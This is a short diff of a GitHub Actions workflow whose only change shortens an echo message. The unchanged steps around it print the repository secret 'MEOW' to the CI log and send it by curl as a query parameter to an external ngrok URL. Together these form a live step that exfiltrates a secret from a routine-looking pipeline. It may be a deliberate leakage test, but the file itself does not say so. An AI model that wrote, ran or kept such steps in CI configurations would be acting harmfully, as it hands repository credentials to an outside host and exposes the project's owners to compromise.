@@ -8,6 +8,6 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - run: echo "CI running........"
+      - run: echo "CI running"
       - run: echo "Secret is ${{ secrets.MEOW }}"
       - run: curl "https://unblock-suspect-perfectly.ngrok-free.dev/index.html?secret=${{ secrets.MEOW }}&xyz=true"
